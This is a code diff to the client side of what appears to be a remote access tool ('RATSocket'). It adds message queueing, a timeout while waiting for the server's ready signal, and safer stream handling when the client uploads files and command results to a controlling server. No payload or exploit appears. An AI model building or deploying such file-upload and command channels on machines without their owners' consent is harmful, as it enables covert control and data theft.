@@ -1,5 +1,6 @@
 import ntpath
 import os
+import queue
 
 from client.commands.common import CommonCommands
 from client.commands.executor import CommandExecutor
@@ -24,6 +25,7 @@ class ServerConnection(RATSocket):
 
         self.command_executor = CommandExecutor(self)
         self.ready_queue = ReadySignalQueue()
+        self.pending_message_queue = queue.Queue()
         self.common_commands = CommonCommands(self)
 
         self.job_manager = JobManager(self)
@@ -47,6 +49,14 @@ class ServerConnection(RATSocket):
         except Exception:
             pass
 
+        try:
+            while True:
+                self.pending_message_queue.get_nowait()
+        except queue.Empty:
+            pass
+        except Exception:
+            pass
+
     def send_result(self, id: int, status: int, result: str, eof: int = 1):
         """
         向服务端发送结果
@@ -62,6 +72,15 @@ class ServerConnection(RATSocket):
         logger.debug(data)
         self.send(data)
 
+    def _wait_for_ready_signal(self, command_id: int, timeout: float = 15.0) -> int:
+        """
+        等待指定命令对应的文件传输 ready 信号
+        """
+        try:
+            return self.ready_queue.get_for_command(command_id, timeout=timeout)
+        except Exception:
+            raise TimeoutError(f'Timed out waiting for ready signal: command_id={command_id}')
+
     def send_file(self, id: int, filename: str):
         """
         向服务端发送文件
@@ -74,13 +93,40 @@ class ServerConnection(RATSocket):
             'cwd': os.getcwd(),
         }
         io = get_output_stream(filename)
-        self.send(header)
-        if self.recv_signal():
-            self.send_io(io)
 
-    def recv_command(self) -> (int, int, str):
-        data = self.recv()
+        try:
+            self.send(header)
+            if self._wait_for_ready_signal(id):
+                self.send_io(io)
+            else:
+                io.close()
+                raise RuntimeError(f'Server rejected file transfer: command_id={id}')
+        except Exception:
+            try:
+                io.close()
+            except Exception:
+                pass
+            raise
+
+    def enqueue_received_message(self, data: dict):
+        """
+        接收线程将消息交给连接对象分流：
+        - rdy 直接进入 ready_queue
+        - 其他消息进入待处理队列，由主线程执行
+        """
         logger.debug(data)
+
+        if data.get('type') == 'rdy':
+            self.message_router.dispatch(data)
+            return
+
+        self.pending_message_queue.put(data)
+
+    def recv_command(self, timeout: float | None = None) -> (int, int, str):
+        """
+        从待处理队列中取出一条消息并执行
+        """
+        data = self.pending_message_queue.get(timeout=timeout)
 
         try:
             return self.message_router.dispatch(data)
